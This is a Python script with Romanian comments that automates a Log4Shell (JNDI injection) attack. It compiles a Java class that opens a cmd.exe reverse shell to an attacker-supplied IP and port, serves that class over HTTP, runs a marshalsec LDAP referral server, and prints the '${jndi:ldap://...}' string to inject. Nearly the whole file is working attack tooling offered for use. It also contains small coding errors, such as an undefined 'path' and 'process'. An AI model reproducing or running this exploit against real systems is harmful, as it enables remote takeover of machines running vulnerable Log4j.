import subprocess
import http.server
import socketserver
import threading
import argparse
import sys
import os
from pathlib import Path
from colorama import Fore, init

# Definim portul pentru serverul HTTP
PORT = 8000

# Funcție pentru a porni serverul HTTP
def start_http_server():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Serving HTTP on port {PORT}")
        httpd.serve_forever()
        
def update_packages():
    """Actualizează pachetele deja instalate."""
    try:
        print("Actualizăm lista de pachete...")
        subprocess.run(['sudo', 'apt-get', 'update'], check=True)
        print("Actualizăm pachetele instalate...")
        subprocess.run(['sudo', 'apt-get', 'upgrade', '-y'], check=True)
        print("Pachetele au fost actualizate cu succes.")
    except subprocess.CalledProcessError as e:
        print(f"A apărut o eroare la actualizarea pachetelor: {e}")

def check_java_installed():
    try:
        # Rulează comanda 'java -version' și capturează output-ul
        result = subprocess.run(['java', '-version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Output-ul comenzii 'java -version' este de obicei în stderr, nu stdout
        if result.returncode == 0:
            print("Java este instalat. Versiunea:")
            print(result.stderr)
        else:
            print("Java nu este instalat sau nu este configurat corect. Se executa instalarea din arhiva...")
            install_jdk()
    
    except FileNotFoundError:
        print("Comanda 'java' nu a fost găsită. Java nu este instalat.")
    except Exception as e:
        print(f"A apărut o eroare la verificarea instalării Java: {e}")
        
def install_jdk():
    try:
        # Verifică dacă directorul /opt/jdk există
        if path.exists("/opt/jdk"):
            print("/opt/jdk already exists. Will now continue to extract.")
        else:
            print("Creating /opt/jdk directory...")
            subprocess.run(["sudo", "mkdir", "/opt/jdk"], check=True)
            
        print("Extracting JDK archive...")
        subprocess.run(["sudo", "tar", "-zxf", "jdk-8u181-linux-x64.tar.gz", "-C", "/opt/jdk"], check=True)

        print("Configuring update-alternatives for java...")
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/java", "java", "/opt/jdk/jdk1.8.0_181/bin/java", "100"], check=True)
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/javac", "javac", "/opt/jdk/jdk1.8.0_181/bin/javac", "100"], check=True)

        print("Displaying java alternatives...")
        subprocess.run(["sudo", "update-alternatives", "--display", "java"], check=True)
        subprocess.run(["sudo", "update-alternatives", "--display", "javac"], check=True)

        print("Setting java alternative...")
        subprocess.run(["sudo", "update-alternatives", "--set", "java", "/opt/jdk/jdk1.8.0_181/bin/java"], check=True)

        print("Verifying Java installation...")
        subprocess.run(["java", "-version"], check=True)
    
    except subprocess.CalledProcessError as e:
        print(f"A command failed: {e.cmd} with return code {e.returncode}")
        print(e.output)
    except FileNotFoundError as e:
        print(f"File not found: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def check_and_install(package_name):
    """Verifică dacă un pachet este instalat și, în caz contrar, îl instalează."""
    try:
        # Verifică dacă pachetul este instalat
        result = subprocess.run(['dpkg', '-s', package_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            print(f"{package_name} nu este instalat. Se instalează...")
            subprocess.run(['sudo', 'apt-get', 'install', '-y', package_name], check=True)
        else:
            print(f"{package_name} este deja instalat.")
    except subprocess.CalledProcessError as e:
        print(f"A apărut o eroare la verificarea sau instalarea {package_name}: {e}")
        
def prerequisites():
	update_packages()
	check_java_installed()
	check_and_install('maven')

def generate_payload(userip: str, port: int, nume_clasa: str) -> None:
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class %s{

    public %s() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
""" % (nume_clasa, nume_clasa, userip, port)

    # writing the exploit to ExploitWin.java file

    p = Path(f"{nume_clasa}.java")

    try:
        p.write_text(program)
        subprocess.run(["javac", str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')

def marshalsec_fetch():
    repo_url = "https://github.com/mbechler/marshalsec.git"
    repo_dir = "marshalsec"
    cwd = os.getcwd()

    try:
        # Verifică dacă repository-ul există deja
        if os.path.exists(repo_dir):
            print(f"Directorul {repo_dir} există.")
            return

        # Clonare repository
        print("Clonăm repository-ul...")
        result = subprocess.run(["git", "clone", repo_url], check=True)
        print("Repository clonat cu succes.")

        # Schimbare director
        print("Schimbăm directorul în marshalsec...")
        os.chdir(repo_dir)
        print("Directorul curent:", os.getcwd())
        print("Conținutul directorului:", os.listdir())

        # Rulare Maven
        print("Rulăm Maven pentru a compila proiectul...")
        result = subprocess.run(["mvn", "clean", "package", "-DskipTests"], check=True)
        print("Proiectul a fost compilat cu succes.")

    except subprocess.CalledProcessError as e:
        print(f"A apărut o eroare la executarea comenzii: {e}")
    except FileNotFoundError as e:
        print(f"Fișierul sau directorul nu a fost găsit: {e}")
    except Exception as e:
        print(f"A apărut o eroare neașteptată: {e}")
    finally:
        # Revenim la directorul inițial
        os.chdir(cwd)
        print("Revenim la directorul inițial:", os.getcwd())

def marshalsec(java_command):
    # Pornim procesul Java
	try:
		java_process = subprocess.Popen(java_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
		print("Java process started successfully.")
        
         # Citește linie cu linie output-ul în timp ce procesul rulează
		while True:
			output = java_process.stdout.readline()
			if output == '' and process.poll() is not None: # Verifică dacă procesul s-a terminat
				break
			if output:
				print(output.strip())
        
		rc = java_process.poll()
		return rc
	except Exception as e:
		print(f"Failed to start Java process: {e}")

def main():
    parser = argparse.ArgumentParser(description='''Un script care primește IP-ul, portul și numele clasei java. 
    Usage: python3 application.py --ip <IP> --port <Port> --nume_clasa <Nume>''')
    
    parser.add_argument('--ip', type=str, help='Adresa IP a serveului LDAP')
    parser.add_argument('--port', type=int, help='Portul Netcat')
    parser.add_argument('--nume_clasa', type=str, help='Clasa java')

    if len(sys.argv) < 4:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    
    # Verificam si instalam softwareurile necesare
    prerequisites()

    # Creăm un thread pentru serverul HTTP
    http_server_thread = threading.Thread(target=start_http_server)
    http_server_thread.daemon = True  # Permite terminarea thread-ului odată cu scriptul principal
    http_server_thread.start()
    
    # Generam payloadul
    generate_payload(args.ip, args.port, args.nume_clasa)
    
    # Clonam aplicatia marshalsec
    marshalsec_fetch()
    
    # Comanda pentru a rula procesul Java
    java_command = [
        "java", "-cp", "marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar",
        "marshalsec.jndi.LDAPRefServer", f"http://{args.ip}:8000/#{args.nume_clasa}"
    ]
    
    print(f'Adresa IP: {args.ip}')
    print(f'Numele: {args.nume_clasa}')
    print(java_command)
    print(f'Introduceti stringul malitios: ${{jndi:ldap://{args.ip}:1389/{args.nume_clasa}}}')
	
	# Rulam serverul LDAP
    marshalsec(java_command)

    # Așteptăm terminarea serverului HTTP (thread-ul va rula indefinit)
    http_server_thread.join()

if __name__ == '__main__':
    main()
